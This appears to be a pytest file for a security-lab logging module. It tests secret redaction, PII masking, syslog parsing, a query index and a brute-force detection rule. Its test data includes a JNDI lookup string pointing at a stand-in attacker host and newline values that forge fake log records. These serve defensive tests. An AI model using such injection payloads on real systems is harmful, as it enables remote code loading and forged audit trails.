import json
from datetime import datetime, timedelta, timezone

from aisec_lab import load_lab_module

s = load_lab_module(__file__, "seclog")
T0 = datetime(2026, 11, 19, 10, 0, 0, tzinfo=timezone.utc)


def test_secrets_are_removed_and_pii_masked():
    jwt = s.fake_jwt()
    ev = {"password": "FAKE-pw", "api_key": "FAKE-k", "headers": {"Authorization": "Bearer " + jwt},
          "msg": f"token={jwt} mail asha.k@example.in card 4111 1111 1111 1111"}
    out = json.dumps(s.redact(ev))
    for leaked in ("FAKE-pw", "FAKE-k", jwt, "asha.k@", "4111 1111 1111 1111"):
        assert leaked not in out
    assert "****1111" in out and "a***@example.in" in out


def test_non_card_numbers_are_not_masked():
    assert s.redact_text("order 1234567890123") == "order 1234567890123"  # fails Luhn


def test_crlf_injection_forges_a_line_in_naive_log_but_not_in_safe_log():
    evil = "bob\n2026-11-19T10:00:05Z user=admin login success"
    assert len(s.naive_log_line("t", evil, "login failed").splitlines()) == 2
    safe = s.safe_log_line("t", evil, "login failed")
    assert len(safe.splitlines()) == 1 and json.loads(safe)["user.name"].startswith("bob" + chr(92) + "n")


def test_lookup_syntax_is_neutralized():
    assert "${" not in s.neutralize("${jndi:ldap://attacker.test/a}")


def test_rfc5424_priority_timestamp_and_structured_data():
    line = s.format_rfc5424("authpriv", "warning", T0, "h", "app", "1", "ID", {"a@32473": {"k": 'v"]x'}}, "m")
    assert line.startswith("<84>1 2026-11-19T10:00:00.000Z h app 1 ID [a@32473 k=")  # 10*8+4
    p = s.parse_rfc5424(line)
    assert p["facility"] == 10 and p["severity"] == 4 and p["sd"]["a@32473"]["k"] == 'v"]x'


def test_syslog_message_cannot_inject_new_records():
    line = s.format_rfc5424("user", "info", T0, "h", "app", "1", "-", None, "a\n<14>1 fake record")
    assert len(line.splitlines()) == 1


def _pipeline_with_failures(n, ip="203.0.113.50", step=5):
    idx = s.MiniIndex()
    pipe = s.Pipeline(idx)
    for i in range(n):
        pipe.process(s.format_rfc5424("authpriv", "warning", T0 + timedelta(seconds=i * step), "h", "api", "1", "F",
                                      {"audit@32473": {"action": "login", "outcome": "failure", "user": "u", "src": ip}}, "x"))
    pipe.process("garbage")
    return idx, pipe


def test_pipeline_indexes_parsed_events_and_keeps_bad_lines():
    idx, pipe = _pipeline_with_failures(3)
    assert len(idx.docs) == 3 and pipe.dead_letter == ["garbage"]
    assert idx.docs[0]["source.ip"] == "203.0.113.50" and idx.docs[0]["log.level"] == "warning"


def test_kql_like_query_and_or_not_wildcards():
    idx, _ = _pipeline_with_failures(2)
    assert len(idx.query("source.ip:203.0.113.* AND event.outcome:failure")) == 2
    assert idx.query("source.ip:10.* OR event.outcome:success") == []
    assert len(idx.query("NOT event.outcome:success")) == 2


def test_bruteforce_rule_fires_at_threshold_only():
    idx, _ = _pipeline_with_failures(5)
    assert s.detect_bruteforce(idx)[0]["count"] == 5
    idx2, _ = _pipeline_with_failures(4)
    assert s.detect_bruteforce(idx2) == []
    idx3, _ = _pipeline_with_failures(5, step=20)  # spread over 80 s: below 5 per 60 s
    assert s.detect_bruteforce(idx3) == []
